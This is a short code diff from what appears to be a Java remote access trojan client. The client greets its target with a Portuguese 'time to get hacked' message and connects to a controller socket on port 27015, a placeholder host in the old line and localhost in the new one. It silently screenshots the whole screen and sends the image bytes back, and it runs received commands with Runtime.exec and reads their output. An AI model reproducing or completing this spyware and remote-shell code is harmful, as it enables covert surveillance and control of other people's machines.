@@ -14,7 +14,7 @@ public class Client {
     public static void main(String[] args) {
         try {
             System.out.println("Opa ta na hora de ser haskiado");
-            connection = new Connection(new Socket("IP DO HOST", 27015));
+            connection = new Connection(new Socket("localhost", 27015));
 
             OsCheck.OSType ostype = OsCheck.getOperatingSystemType();
             switch (ostype) {
@@ -82,12 +82,13 @@ public class Client {
                 Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
                 BufferedImage screenshot = new Robot().createScreenCapture(screenRect);
 
-                // Save as JPEG
-                File file = File.createTempFile("temporaria", ".png");
+                ByteArrayOutputStream baos = new ByteArrayOutputStream();
+                ImageIO.write( screenshot, "jpg", baos );
+                baos.flush();
+                byte[] imageBytes = baos.toByteArray();
+                baos.close();
 
-                ImageIO.write(screenshot, "png", file);
-
-                connection.sendMessage(new Message("screen", file));
+                connection.sendMessage(new Message("screen", imageBytes));
             } else {
                 Process proc = Runtime.getRuntime().exec(command);
                 Scanner respostaDoComando = new Scanner(proc.getInputStream());
